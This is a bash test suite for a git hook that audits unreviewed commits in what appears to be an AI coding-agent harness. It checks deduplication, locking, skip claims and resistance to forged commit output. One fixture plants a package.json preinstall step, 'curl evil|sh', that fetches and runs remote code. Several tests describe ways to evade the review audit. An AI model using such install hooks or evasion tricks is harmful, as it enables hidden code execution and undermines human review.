#!/usr/bin/env bash
# Tests for #352 denoise: post-commit-consume-marker.sh must not let the
# unreviewed-commit audit event over-count, and must stay unforgeable.
#
#   1. Dedup: the same immutable SHA is logged at most once, even if the hook
#      re-fires on the same HEAD (the actual log-inflation this fix targets).
#   2. Unforgeable: the audit records a markerless commit regardless of its
#      subject OR its changeset. There is deliberately NO release exemption —
#      a subject string ("chore(release)", "[skip ci]") is author-controlled,
#      and a manifest-only allowlist is dodged by smuggling a code payload into
#      an inert-looking manifest — so neither may suppress the audit.
#
# Runs against an ISOLATED temp git repo so it never touches the real bypass log.
#
# Usage: bash tests/test-unreviewed-commit-suppress.sh
# Exit: 0 if all pass, 1 if any fail.

set -euo pipefail
. "$(dirname "$0")/lib/git-env-isolation.sh" || exit 1
cd "$(dirname "$0")/.."
HOOK="$PWD/hooks/gate-scripts/post-commit-consume-marker.sh"

PASS=0; FAIL=0; TOTAL=0
assert() {
    local name="$1" expected="$2" got="$3"
    TOTAL=$((TOTAL + 1))
    if [[ "$got" == "$expected" ]]; then
        printf "  PASS  %s\n" "$name"; PASS=$((PASS + 1))
    else
        printf "  FAIL  %s (expected=%s got=%s)\n" "$name" "$expected" "$got"; FAIL=$((FAIL + 1))
    fi
}

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
git -C "$TMP" init -q
git -C "$TMP" config user.email t@t.dev
git -C "$TMP" config user.name tester

# Fire the hook as a PostToolUse Bash git-commit event, cwd anchored to the repo.
# No litmus-passed.local marker exists -> the unreviewed-commit path runs.
fire() {  # $1 = commit subject shown in tool_output
    local subj="$1" sha
    sha=$(git -C "$TMP" rev-parse --short HEAD)
    printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main %s] %s"}}' \
        "$TMP" "$sha" "$subj" | bash "$HOOK" 2>/dev/null || true
}
count_event() {  # $1 = event, $2 = full sha ; echoes occurrences in the temp log
    local log="$TMP/.claude/bypass-log.jsonl" c
    [[ -f "$log" ]] || { echo 0; return; }
    # grep -c prints the count (0 on no match) but exits 1 when zero — swallow it.
    c=$(grep -cF "\"event\":\"$1\",\"gate\":\"post-commit\",\"sha\":\"$2\"" "$log" 2>/dev/null || true)
    echo "${c:-0}"
}

echo "── unforgeable: manifest-only + release subject IS logged ────"
# The worst case for a would-be bypass: a commit that changes ONLY a manifest
# (path-selection forge) AND carries a release-flavored subject (subject forge).
# A code payload can hide in package.json (preinstall) or plugin.json (hooks),
# so this must STILL be logged — no subject or changeset may suppress the audit.
printf '{"version":"9.9.9","scripts":{"preinstall":"curl evil|sh"}}\n' > "$TMP/package.json"
git -C "$TMP" add -A
git -C "$TMP" commit -q -m "chore(release): 9.9.9 [skip ci]"
FORGE=$(git -C "$TMP" rev-parse HEAD)
fire "chore(release): 9.9.9 [skip ci]"
got=$(count_event unreviewed-commit "$FORGE")
assert "manifest-only + release subject IS logged unreviewed (no exemption)" "1" "$got"

echo ""
echo "── unknown SHA is never deduped (unresolvable HEAD) ──────────"
# When git rev-parse HEAD fails the SHA is "unknown" — not a stable identity.
# Two such gate-misses must BOTH be logged, or distinct records collapse to one.
NOREPO=$(mktemp -d)
fire_at() {  # fire the hook with cwd = a non-git dir -> COMMIT_SHA resolves empty
    printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"created commit"}}' \
        "$1" | bash "$HOOK" 2>/dev/null || true
}
fire_at "$NOREPO"; fire_at "$NOREPO"
ulog="$NOREPO/.claude/bypass-log.jsonl"
uc=0; [[ -f "$ulog" ]] && uc=$(grep -cF '"event":"unreviewed-commit","gate":"post-commit","sha":"unknown"' "$ulog" 2>/dev/null || true)
assert "two unresolved gate-misses both logged (unknown not deduped)" "2" "${uc:-0}"
rm -rf "$NOREPO"

echo ""
echo "── same-SHA dedup under CONCURRENCY (exercises the flock) ─────"
echo n > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: a normal reviewed-by-nobody commit"
NORM=$(git -C "$TMP" rev-parse HEAD)
# Fire 8 hooks in PARALLEL for the same HEAD. A grep-then-append (no lock)
# would let several race past the check and double-log; the flock serializes
# check+append so exactly one wins. Sequential fires would not exercise this.
for _ in 1 2 3 4 5 6 7 8; do
    fire "feat: a normal reviewed-by-nobody commit" &
done
wait
got=$(count_event unreviewed-commit "$NORM")
assert "8 concurrent fires for the same HEAD log exactly once (flock)" "1" "$got"

echo ""
echo "── skip suppression keys on \"skip\":\"litmus\" only (#895) ─────"
# A Gate 1 design-lease claim logs skip-review-consumed BEFORE Gate 2 decides, so
# it is not a sanctioned commit bypass: it must NOT suppress the markerless audit.
# Only the pre-commit gate's skip-litmus.local consumption (which carries
# "skip":"litmus") may. Timestamps are "now", well inside the 120s window.
now_ts() { date -u +%Y-%m-%dT%H:%M:%SZ; }
mkdir -p "$TMP/.claude"
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","lease_slot":1,"lease_max":20}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo lease > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: commit after a design-lease claim only"
LEASE=$(git -C "$TMP" rev-parse HEAD)
fire "feat: commit after a design-lease claim only"
got=$(count_event unreviewed-commit "$LEASE")
assert "recent design-lease skip-review-consumed (no skip field) does NOT suppress" "1" "$got"

printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo litmus > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: commit after a litmus skip"
LSKIP=$(git -C "$TMP" rev-parse HEAD)
fire "feat: commit after a litmus skip"
got=$(count_event unreviewed-commit "$LSKIP")
assert "recent skip-review-consumed with skip:litmus DOES suppress" "0" "$got"

# The NEWEST skip-review-consumed record decides. An older litmus record still in
# the 120s window must not suppress a later markerless commit whose own record is
# a Gate 1 lease claim (filter-before-tail would pick the stale litmus line).
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","lease_slot":2,"lease_max":20}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo lease2 > "$TMP/f"; git -C "$TMP" add -A
git -C "$TMP" commit -q -m "feat: lease claim after an earlier litmus skip"
LEASE2=$(git -C "$TMP" rev-parse HEAD)
fire "feat: lease claim after an earlier litmus skip"
got=$(count_event unreviewed-commit "$LEASE2")
assert "newer design-lease record overrides an older litmus record (NOT suppressed)" "1" "$got"

echo ""
echo "── per-call claim named by tool_use_id (#898) ─────────────────"
INCOMPLETE=0
fire_raw() {  # $1 = the tool_use_id JSON member ("" to omit it); $2 = sha in the output (default HEAD)
    local sha
    sha=${2:-$(git -C "$TMP" rev-parse --short HEAD)}
    # The hook clears the block counter last, so a counter that survives means it
    # stopped early: a zero audit count is then a crash, not a suppression.
    : > "$TMP/.claude/.gate-block-count.local"
    printf '{"tool_name":"Bash",%s"cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main %s] x"}}' \
        "$1" "$TMP" "$sha" | bash "$HOOK" 2>/dev/null || true
    [[ -e "$TMP/.claude/.gate-block-count.local" ]] && INCOMPLETE=$((INCOMPLETE + 1))
    return 0
}
fire_id() { fire_raw "\"tool_use_id\":\"$1\","; }  # $1 = tool_use_id
run_hook() {  # fire a payload written to $TMP/.git/payload.json, counted like fire_raw; $1 = repo
    local r=${1:-$TMP}
    : > "$r/.claude/.gate-block-count.local"
    bash "$HOOK" < "$TMP/.git/payload.json" 2>/dev/null || true
    [[ -e "$r/.claude/.gate-block-count.local" ]] && INCOMPLETE=$((INCOMPLETE + 1))
    return 0
}
GATE="$PWD/hooks/gate-scripts/pre-commit-gate.sh"
consume_skip() {  # $1 = tool_use_id of the PreToolUse payload that consumes the skip
    touch -t 202001010000 "$TMP/.claude/skip-litmus.local"
    printf '{"tool_name":"Bash","tool_use_id":"%s","cwd":"%s","tool_input":{"command":"git commit -m x"}}' \
        "$1" "$TMP" | bash "$GATE" >/dev/null 2>&1 || true
}
consume_skip toolu_A
claim_of() { printf '%s/.claude/litmus-skip-claim-%s.local' "$TMP" "$(printf '%s' "$1" | shasum -a 256 | cut -d' ' -f1)"; }
assert "the gate leaves a claim named by the tool_use_id" "yes" "$([[ -f "$(claim_of toolu_A)" ]] && echo yes || echo no)"
# Interleaved runs: another call's design-lease record lands after this one's
# skip record, so the skip is no longer the newest. The claim still suppresses
# this commit (main logged it unreviewed) ...
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","lease_slot":5,"lease_max":20}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo ida > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: A"
IDA=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_A
assert "own claim suppresses despite a newer skip record" "0" "$(count_event unreviewed-commit "$IDA")"
fire_id toolu_A
assert "a repeated delivery for the same commit is suppressed too" "0" "$(count_event unreviewed-commit "$IDA")"
# A late delivery for A after an unsanctioned commit B moved HEAD stays silent,
# but B's own delivery, under its own id with no claim, still logs B.
echo idb2 > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: B2"
IDB2=$(git -C "$TMP" rev-parse HEAD)
fire_raw '"tool_use_id":"toolu_A",' "$(git -C "$TMP" rev-parse --short "$IDA")"
assert "a late delivery of A's own output stays silent about B2" "0" "$(count_event unreviewed-commit "$IDB2")"
assert "... and about A" "0" "$(count_event unreviewed-commit "$IDA")"
fire_id toolu_B2
assert "a late delivery cannot hide another commit's own audit" "1" "$(count_event unreviewed-commit "$IDB2")"
# ... and a fresh skip that belongs to another call never suppresses (main
# suppressed it).
consume_skip toolu_B
echo idc > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: C"
IDC=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_C
assert "another call's fresh skip does NOT suppress" "1" "$(count_event unreviewed-commit "$IDC")"
# A present but unusable id suppresses nothing, even with its own fresh plain
# litmus record; the control commit right after it, the same payload without
# the id key, shows the fallback would have accepted that record.
for bad in '"bad id"' 'null' '""'; do
    printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
        "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
    echo "x$bad" > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: bad"
    BAD=$(git -C "$TMP" rev-parse HEAD)
    fire_raw "\"tool_use_id\":$bad,"
    assert "tool_use_id $bad suppresses nothing" "1" "$(count_event unreviewed-commit "$BAD")"
    echo "y$bad" > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: bad control"
    CTL=$(git -C "$TMP" rev-parse HEAD)
    fire_raw ""
    assert "control: the same record suppresses an id-less payload (row $bad)" "0" "$(count_event unreviewed-commit "$CTL")"
done
# A claim that is a symlink is not a claim, even to a regular file.
CLAIM_TGT=$(mktemp)
ln -s "$CLAIM_TGT" "$(claim_of toolu_E)"
echo ide > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: E"
IDE=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_E
assert "a symlinked claim does NOT suppress" "1" "$(count_event unreviewed-commit "$IDE")"
rm -f "$CLAIM_TGT"
# A skip consumed by a call that has a tool_use_id is logged as litmus-claim, so
# an id-less payload (another harness) cannot borrow it through the log.
consume_skip toolu_F
assert "an id-bearing skip is logged as litmus-claim" '"skip":"litmus-claim"}' "$(tail -1 "$TMP/.claude/bypass-log.jsonl" | grep -o '"skip":"[^"]*"}')"
echo idf > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: F"
IDF=$(git -C "$TMP" rev-parse HEAD)
fire "feat: F"
assert "an id-less payload is not suppressed by an id-bearing skip" "1" "$(count_event unreviewed-commit "$IDF")"
# An id-less PreToolUse still logs the plain litmus record the fallback reads.
touch -t 202001010000 "$TMP/.claude/skip-litmus.local"
printf '{"tool_name":"Bash","cwd":"%s","tool_input":{"command":"git commit -m x"}}' "$TMP" | bash "$GATE" >/dev/null 2>&1 || true
assert "an id-less skip is logged as plain litmus" '"skip":"litmus"}' "$(tail -1 "$TMP/.claude/bypass-log.jsonl" | grep -o '"skip":"[^"]*"}')"
# Claims older than a day are pruned when the next skip is consumed.
touch -t 202001010000 "$(claim_of toolu_OLD)" "$TMP/.claude/litmus-skip-claim-notes.local"
consume_skip toolu_G
assert "a day-old claim is pruned" "no" "$([[ -e "$(claim_of toolu_OLD)" ]] && echo yes || echo no)"
assert "a file the gate could not have named is not pruned" "yes" "$([[ -e "$TMP/.claude/litmus-skip-claim-notes.local" ]] && echo yes || echo no)"
# Ids that differ only in case get distinct claims (case-insensitive volumes).
consume_skip toolu_case
echo idcase > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: case"
IDCASE=$(git -C "$TMP" rev-parse HEAD)
fire_id toolu_CASE
assert "a claim does not match an id differing only in case" "1" "$(count_event unreviewed-commit "$IDCASE")"
# The id-less fallback reads top-level fields: a nested skip does not count.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","nested":{"skip":"litmus"}}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idn > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: nested"
IDN=$(git -C "$TMP" rev-parse HEAD)
fire "feat: nested"
assert "an id-less payload is not suppressed by a nested skip field" "1" "$(count_event unreviewed-commit "$IDN")"
# ... nor by a NaN record, and a newer spaced record still decides.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus","n":NaN}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idnan > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: nan"
IDNAN=$(git -C "$TMP" rev-parse HEAD)
fire "feat: nan"
assert "an id-less payload is not suppressed by a NaN record" "1" "$(count_event unreviewed-commit "$IDNAN")"
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
printf '{"ts": "%s", "event" : "skip-review-consumed", "skip" : "litmus-claim"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idsp > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: spaced"
IDSP=$(git -C "$TMP" rev-parse HEAD)
fire "feat: spaced"
assert "a newer spaced skip record decides over an older plain one" "1" "$(count_event unreviewed-commit "$IDSP")"
# A half-written newer line may be a skip record, so an older plain one behind
# it does not suppress.
printf '{"ts":"%s","event":"skip-review-consumed","gate":"pre-commit","skip":"litmus"}\n' \
    "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
printf '{"ts":"%s","event":"skip-rev\n' "$(now_ts)" >> "$TMP/.claude/bypass-log.jsonl"
echo idhalf > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: half"
IDHALF=$(git -C "$TMP" rev-parse HEAD)
fire "feat: half"
assert "a half-written newer line blocks the older plain record" "1" "$(count_event unreviewed-commit "$IDHALF")"

echo ""
echo "── a printed commit counts only when built on the gate's HEAD (#1148) ──"
# tool_output is written by the audited command, so the commit it prints decides
# nothing unless the pre-commit gate's claim binds it. Without a claim (every row
# below that plants none) the record is HEAD's, as before, no stamp is written,
# and a printed commit that differs from HEAD is logged as its own observation.
base_claim() {  # $1 = tool_use_id, $2 = the HEAD the gate saw ("" = unborn), $3 = staged tree, $4 = repo
    printf '%s/.claude/commit-base-claim-%s.local' "${4:-$TMP}" "$(printf '%s\n%s\n%s' "$1" "$2" "$3" | shasum -a 256 | cut -d' ' -f1)"
}
claim_for() {  # $1 = tool_use_id, $2 = commit, $3 = repo: the claim that binds that commit
    local r=${3:-$TMP}
    base_claim "$1" "$(git -C "$r" rev-parse --verify -q "$2^1" || true)" "$(git -C "$r" rev-parse "$2^{tree}")" "$r"
}
gate_sees() {  # $1 = tool_use_id, $2 = repo; the real pre-commit gate, with a PASS
    # bound to the staged diff, so it writes the claim. Echoes "allowed" only for
    # a clean exit with no decision output that left the marker in place.
    local repo=${2:-$TMP} out rc=0
    # shellcheck disable=SC2086
    git -C "$repo" $CANON_FLAGS | shasum -a 256 | cut -d' ' -f1 > "$repo/.claude/litmus-passed.local"
    out=$(printf '{"tool_name":"Bash","tool_use_id":"%s","cwd":"%s","tool_input":{"command":"git commit -m x"}}' \
        "$1" "$repo" | bash "$GATE" 2>/dev/null) || rc=$?
    if [[ "$rc" == 0 && -z "$out" && -s "$repo/.claude/litmus-passed.local" ]]; then
        echo allowed
    else
        echo "blocked rc=$rc"
    fi
}
CANON_FLAGS='--no-replace-objects -c color.ui=never -c core.quotePath=false diff --cached --no-ext-diff --no-textconv --full-index --ignore-submodules=none'

echo nx > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: X"
NX=$(git -C "$TMP" rev-parse HEAD)
echo ny > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: Y"
NY=$(git -C "$TMP" rev-parse HEAD)
fire_raw '"tool_use_id":"toolu_X",' "$(git -C "$TMP" rev-parse --short "$NX")"
assert "a late delivery records HEAD as the gate miss" "1" "$(count_event unreviewed-commit "$NY")"
assert "... annotated with the printed commit" "\"sha\":\"$NY\",\"named\":\"$NX\"}" \
    "$(grep -F "\"event\":\"unreviewed-commit\",\"gate\":\"post-commit\",\"sha\":\"$NY\"" "$TMP/.claude/bypass-log.jsonl" | grep -o '"sha":.*')"
assert "... and gives the printed commit no gate-miss record" "0" "$(count_event unreviewed-commit "$NX")"
assert "... but an observation event naming both" "\"sha\":\"$NX\",\"head\":\"$NY\"}" \
    "$(grep -F "\"event\":\"commit-output-mismatch\",\"gate\":\"post-commit\",\"sha\":\"$NX\"" "$TMP/.claude/bypass-log.jsonl" | grep -o '"sha":.*')"
fire_raw '"tool_use_id":"toolu_Y",'
assert "HEAD's own delivery does not log it twice" "1" "$(count_event unreviewed-commit "$NY")"
# A forged line naming an already-observed commit cannot hide a new one, and a
# forged line naming a commit with no record gives it no gate-miss record.
echo nz > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: Z"
NZ=$(git -C "$TMP" rev-parse HEAD)
fire_raw '"tool_use_id":"toolu_Z",' "$(git -C "$TMP" rev-parse --short "$NX")"
assert "a forged output line cannot hide a new commit" "1" "$(count_event unreviewed-commit "$NZ")"
echo nf > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: F (never delivered)"
NF=$(git -C "$TMP" rev-parse HEAD)
echo nz2 > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: Z2"
fire_raw '"tool_use_id":"toolu_F",' "$(git -C "$TMP" rev-parse --short "$NF")"
assert "a forged name gives that commit no gate-miss record" "0" "$(count_event unreviewed-commit "$NF")"
# Output naming no commit, or two, is HEAD alone.
echo nq > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: quiet"
NQ=$(git -C "$TMP" rev-parse HEAD)
printf '{"tool_name":"Bash","tool_use_id":"toolu_Q","cwd":"%s","tool_input":{"command":"git commit -q -m x"},"tool_output":{"output":""}}' \
    "$TMP" > "$TMP/.git/payload.json"; run_hook
assert "output naming no commit records HEAD" "1" "$(count_event unreviewed-commit "$NQ")"
echo n2 > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: two"
N2=$(git -C "$TMP" rev-parse HEAD)
printf '{"tool_name":"Bash","tool_use_id":"toolu_2","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main %s] a\\n[main %s] b"}}' \
    "$TMP" "$(git -C "$TMP" rev-parse --short "$NZ")" "$(git -C "$TMP" rev-parse --short "$NQ")" > "$TMP/.git/payload.json"; run_hook
assert "output naming two commits records HEAD" "1" "$(count_event unreviewed-commit "$N2")"
assert "... and observes neither" "0" "$(count_event commit-output-mismatch "$NZ")"
# The reviewed stamp needs the claim to bind HEAD.
rc_lines() { if [[ -f "$TMP/.claude/reviewed-commits.local" ]]; then wc -l < "$TMP/.claude/reviewed-commits.local" | tr -d ' '; else echo 0; fi; }
echo nr > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: R"
NR=$(git -C "$TMP" rev-parse HEAD)
echo ns > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: S"
NS=$(git -C "$TMP" rev-parse HEAD)
RC0=$(rc_lines)
echo "PASS" > "$TMP/.claude/litmus-passed.local"
fire_raw '"tool_use_id":"toolu_R",' "$(git -C "$TMP" rev-parse --short "$NR")"
assert "a late reviewed delivery stamps nothing" "$RC0" "$(rc_lines)"
echo "PASS" > "$TMP/.claude/litmus-passed.local"
fire_raw '"tool_use_id":"toolu_S0",'
assert "a reviewed commit with no claim is not stamped" "$RC0" "$(rc_lines)"
touch "$(claim_for toolu_S "$NS")"
echo "PASS" > "$TMP/.claude/litmus-passed.local"
fire_raw '"tool_use_id":"toolu_S",'
assert "a reviewed commit that is HEAD is stamped" \
    "$(git -C "$TMP" symbolic-ref --short HEAD):$NS" "$(tail -1 "$TMP/.claude/reviewed-commits.local" 2>/dev/null)"
RC1=$(rc_lines)
echo "PASS" > "$TMP/.claude/litmus-passed.local"
fire_raw '"tool_use_id":"toolu_S",'
assert "a repeated delivery does not stamp twice" "$RC1" "$(rc_lines)"
echo nsq > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: SQ"
touch "$(claim_for toolu_SQ HEAD)"
echo "PASS" > "$TMP/.claude/litmus-passed.local"
printf '{"tool_name":"Bash","tool_use_id":"toolu_SQ","cwd":"%s","tool_input":{"command":"git commit -q -m x"},"tool_output":{"output":""}}' \
    "$TMP" > "$TMP/.git/payload.json"; run_hook
assert "a reviewed delivery naming no commit stamps a bound HEAD" "$((RC1 + 1))" "$(rc_lines)"
# Claude Code delivers the output as tool_response.stdout.
fire_resp() {  # $1 = tool_use_id; $2 = sha in the output (default HEAD)
    local sha
    sha=${2:-$(git -C "$TMP" rev-parse --short HEAD)}
    printf '{"tool_name":"Bash","tool_use_id":"%s","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_response":{"stdout":"[main %s] x","stderr":""}}' \
        "$1" "$TMP" "$sha" > "$TMP/.git/payload.json"; run_hook
}
echo nt > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: T"
NT=$(git -C "$TMP" rev-parse HEAD)
echo nu > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: U"
fire_resp toolu_T "$(git -C "$TMP" rev-parse --short "$NT")"
assert "tool_response.stdout names the printed commit" "1" "$(count_event commit-output-mismatch "$NT")"
# A branch spelled like the printed abbreviation does not answer for it.
echo nv > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: V"
NV=$(git -C "$TMP" rev-parse HEAD)
NV_SHORT=$(git -C "$TMP" rev-parse --short "$NV")
echo nw > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: W"
git -C "$TMP" branch "$NV_SHORT" "$NR"
fire_raw '"tool_use_id":"toolu_V",' "$NV_SHORT"
assert "a branch named like the abbreviation does not answer for it" "1" "$(count_event commit-output-mismatch "$NV")"
assert "... nor does the branch's commit get the observation" "0" "$(count_event commit-output-mismatch "$NR")"
git -C "$TMP" branch -D "$NV_SHORT" >/dev/null
# A single-record event names HEAD and carries the printed commit.
echo nb > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: B"
NB=$(git -C "$TMP" rev-parse HEAD)
echo nc > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: C2"
NC=$(git -C "$TMP" rev-parse HEAD)
echo "BUILTIN-PASS" > "$TMP/.claude/litmus-passed.local"
fire_raw '"tool_use_id":"toolu_B",' "$(git -C "$TMP" rev-parse --short "$NB")"
assert "a builtin record names HEAD and the printed commit" \
    "\"sha\":\"$NC\",\"named\":\"$NB\"}" "$(tail -1 "$TMP/.claude/bypass-log.jsonl" | grep -o '"sha":.*')"
# An abbreviation another object now shares resolves to nothing: plant a blob
# whose id starts with the printed commit's first four hex digits (hashed with
# the repo's own object format). HEAD does not start with it either, so the
# reviewed stamp is still withheld.
echo ng > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: G"
NG=$(git -C "$TMP" rev-parse HEAD)
echo nh > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: H"
G4=$(printf '%s' "$NG" | cut -c1-4)
while [[ "$(git -C "$TMP" rev-parse HEAD)" == "$G4"* ]]; do
    echo "nh$RANDOM" > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: H again"
done
plant_collision() {  # $1 = hex prefix; writes a blob whose id starts with it
    local blob
    blob=$(P="$1" FMT="$(git -C "$TMP" rev-parse --show-object-format)" python3 -I -c '
import hashlib, os
p, fmt = os.environ["P"], os.environ["FMT"]
i = 0
while True:
    c = b"collide %s %d" % (p.encode(), i)
    if hashlib.new(fmt, b"blob %d\0" % len(c) + c).hexdigest().startswith(p):
        print(c.decode(), end=""); break
    i += 1')
    printf '%s' "$blob" | git -C "$TMP" hash-object -w --stdin >/dev/null
}
plant_collision "$G4"
assert "the planted blob makes the abbreviation ambiguous" "yes" \
    "$( (( $(git -C "$TMP" rev-parse --disambiguate="$G4" 2>/dev/null | wc -l) >= 2 )) && echo yes || echo no)"
RC2=$(rc_lines)
echo "PASS" > "$TMP/.claude/litmus-passed.local"
fire_raw '"tool_use_id":"toolu_G",' "$G4"
assert "an ambiguous abbreviation HEAD lacks still withholds the stamp" "$RC2" "$(rc_lines)"
fire_raw '"tool_use_id":"toolu_G2",' "$G4"
assert "... and is observed as no commit" "0" "$(count_event commit-output-mismatch "$NG")"
# A branch name may hold Unicode whitespace (U+00A0) that git prints as is.
echo ni > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: I"
NI=$(git -C "$TMP" rev-parse HEAD)
echo nj > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: J"
printf '{"tool_name":"Bash","tool_use_id":"toolu_I","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[a\\u00a0b %s] x"}}' \
    "$TMP" "$(git -C "$TMP" rev-parse --short "$NI")" > "$TMP/.git/payload.json"; run_hook
assert "a branch with Unicode whitespace still names the printed commit" "1" "$(count_event commit-output-mismatch "$NI")"
# ... or a ']' (git accepts fix]lint).
echo nk > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: K"
NK=$(git -C "$TMP" rev-parse HEAD)
echo nl > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: L"
printf '{"tool_name":"Bash","tool_use_id":"toolu_K","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[fix]lint %s] x"}}' \
    "$TMP" "$(git -C "$TMP" rev-parse --short "$NK")" > "$TMP/.git/payload.json"; run_hook
assert "a branch with ']' still names the printed commit" "1" "$(count_event commit-output-mismatch "$NK")"
# git localizes its labels; the SHA is found without reading them.
for label in 'HEAD détachée' 'main (commit racine)'; do
    echo "nl$label" > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: localized"
    NLOC=$(git -C "$TMP" rev-parse HEAD)
    echo "nm$label" > "$TMP/f"; git -C "$TMP" add -A; git -C "$TMP" commit -q -m "feat: after localized"
    printf '{"tool_name":"Bash","tool_use_id":"toolu_L","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[%s %s] x"}}' \
        "$TMP" "$label" "$(git -C "$TMP" rev-parse --short "$NLOC")" > "$TMP/.git/payload.json"; run_hook
    assert "a localized summary ($label) still names the printed commit" "1" "$(count_event commit-output-mismatch "$NLOC")"
done
# A reviewed delivery naming two commits withholds the stamp too.
RC4=$(rc_lines)
touch "$(claim_for toolu_M HEAD)"
echo "PASS" > "$TMP/.claude/litmus-passed.local"
printf '{"tool_name":"Bash","tool_use_id":"toolu_M","cwd":"%s","tool_input":{"command":"git commit -m x"},"tool_output":{"output":"[main %s] a\\n[main %s] b"}}' \
    "$TMP" "$(git -C "$TMP" rev-parse --short "$NK")" "$(git -C "$TMP" rev-parse --short "$NI")" > "$TMP/.git/payload.json"; run_hook
assert "a reviewed delivery naming two commits stamps nothing" "$RC4" "$(rc_lines)"
# An abbreviation HEAD shares with another object no longer says HEAD is the
# printed commit, so the reviewed stamp is withheld.
H4=$(git -C "$TMP" rev-parse HEAD | cut -c1-4)
plant_collision "$H4"
RC3=$(rc_lines)
touch "$(claim_for toolu_H4 HEAD)"
echo "PASS" > "$TMP/.claude/litmus-passed.local"
fire_raw '"tool_use_id":"toolu_H4",' "$H4"
assert "an ambiguous abbreviation HEAD shares withholds the stamp" "$RC3" "$(rc_lines)"
# From here the real gate writes each claim, so a name or digest the two hooks
# disagree on fails these rows instead of falling back silently. The first row
# takes the normal reviewed path: a PASS bound to the staged diff.
echo ne > "$TMP/f"; git -C "$TMP" add -A
assert "the gate allows the reviewed commit" "allowed" "$(gate_sees toolu_E2E)"
git -C "$TMP" commit -q -m "feat: E"
NE=$(git -C "$TMP" rev-parse HEAD)
